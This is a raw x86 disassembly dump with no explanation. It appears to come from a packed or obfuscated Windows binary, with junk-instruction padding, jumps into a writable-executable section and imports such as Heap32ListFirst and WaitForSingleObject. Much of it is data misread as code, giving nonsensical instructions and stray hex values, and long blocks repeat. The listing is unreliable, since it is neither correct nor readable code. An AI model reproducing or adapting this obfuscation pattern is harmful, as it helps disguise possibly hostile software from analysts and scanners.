lea esp [ esp + 0x24 ]
call sub_514aff
push 0xbed9ed2d
mov [ esp ] ch
adc al al
pushfd
lea esp [ esp + 0x8 ]
jae rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
jmp rwxdata
push esp
jmp rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
jpe rwxdata
call sub_515ff7
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
pushad
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
je rwxdata
jns rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushfd
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
jmp rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
jmp rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
jo rwxdata
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jne rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_514c3b
mov [ esp + 0x4 ] ebp
rcr ebp cl
bsf bp si
lea ebp [ esp + 0x4 ]
push 0xfd6e4369
test bx 0x71f3
test al bh
mov [ esp + 0x4 ] eax
jmp rwxdata
mov [ esp ] 0xa2
mov [ esp ] eax
cmp ax cx
bt dx bx
push 0x1967850f
cmc
mov [ esp ] esi
clc
bt dx 0xd
cmc
pushfd
mov [ esp ] edi
cmp dh dh
bt edx 0x11
clc
push ebx
clc
push eax
jmp rwxdata
stc
test eax eax
call sub_517c79
sub_514e64
push 0x77131c72
call sub_51498a
add [ eax ] al
inc esi
imul ebp [ esi + 0x64 ] 0x73726946
je rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
jb rwxdata
jbe rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
cmp edi [ ecx - 0x6278c946 ]
jae rwxdata
sbb al 0xfb
pop edi
pop edi
je rwxdata
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
xor ah [ esi - 0x5a ]
int3
jae rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
jbe rwxdata
jb rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_514efb
push 0x6103faae
clc
cmp ebx 0x2
pushad
lea esp [ esp + 0x28 ]
je rwxdata
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
push edx
cmc
pushfd
cmp ebx 0x3
call sub_516054
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
call sub_516af7
adc si dx
btc ax 0x1
aaa
mov esi edi
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
sub_514f1a
mov [ esp ] 0x63
lea esp [ esp + 0x10 ]
jne rwxdata
push edx
mov [ esp ] 0x1e
push edx
lea esp [ esp + 0x8 ]
jg rwxdata
jmp rwxdata
call sub_515600
push edx
fadd st4
sti
xchg ecx eax
call sub_4ba224
push 0x1ac010ef
call sub_519dcf
test eax 0xe810b03b
pushad
jmp rwxdata
push 0xddac9c27
lea esp [ esp + 0x24 ]
call j_sub_51680a
push 0x73bc3b52
pushad
lea esp [ esp + 0x24 ]
jmp rwxdata
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
